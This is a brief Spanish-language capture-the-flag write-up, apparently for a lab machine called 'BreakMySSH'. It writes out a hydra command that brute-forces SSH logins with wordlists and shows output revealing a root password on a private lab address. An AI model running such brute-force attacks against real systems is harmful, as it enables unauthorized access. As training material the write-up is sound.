# BreakMySSH

Con un `nmap` vemos que solo está abierto el puerto de SSH. Por el nombre de la máquina me puedo imaginar que hay que hacerle fuerza bruta.

```bash
hydra -L /usr/share/wordlists/SecLists-2025.2/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ssh://$IPTARGET
```

```bash
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: root   password: estrella
```

![[Pasted image 20250724032351.png]]